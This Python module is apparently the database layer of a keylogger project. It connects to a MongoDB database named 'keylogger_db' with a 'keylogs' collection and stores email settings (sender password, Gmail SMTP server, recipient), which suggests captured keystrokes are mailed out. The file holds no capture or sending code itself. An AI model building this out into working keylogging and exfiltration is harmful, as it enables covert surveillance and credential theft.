import pymongo
import os
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# MongoDB Configuration (still allow overrides via environment variables)
MONGO_URI = os.environ.get("MONGO_URI", "mongodb://localhost:27017/")
DATABASE_NAME = "keylogger_db"
SETTINGS_COLLECTION_NAME = "settings"
KEYLOGS_COLLECTION_NAME = "keylogs"  # Add this for consistency

def get_db():
    """Gets the MongoDB database object."""
    try:
        client = pymongo.MongoClient(MONGO_URI)
        db = client[DATABASE_NAME]
        logging.info("MongoDB connection successful")
        return db
    except pymongo.errors.ConnectionFailure as e:
        logging.error(f"MongoDB connection error: {e}")
        raise

def get_settings(db):
    """Retrieves email settings from the database.  Creates default settings if they don't exist."""
    settings_collection = db[SETTINGS_COLLECTION_NAME]
    settings = settings_collection.find_one({"_id": "email_settings"})

    if not settings:
        # Default settings (you might want to adjust these)
        default_settings = {
            "_id": "email_settings",
            "sender_email": "",
            "sender_password": "",
            "smtp_server": "smtp.gmail.com",  # Default to Gmail
            "smtp_port": 587,  # Default to Gmail's TLS port
            "recipient_email": ""
        }
        settings_collection.insert_one(default_settings)
        settings = default_settings
        logging.info("Created default email settings.")

    return settings

def update_settings(db, new_settings):
    """Updates email settings in the database."""
    settings_collection = db[SETTINGS_COLLECTION_NAME]
    settings_collection.update_one({"_id": "email_settings"}, {"$set": new_settings}, upsert=True)
    logging.info("Email settings updated.") 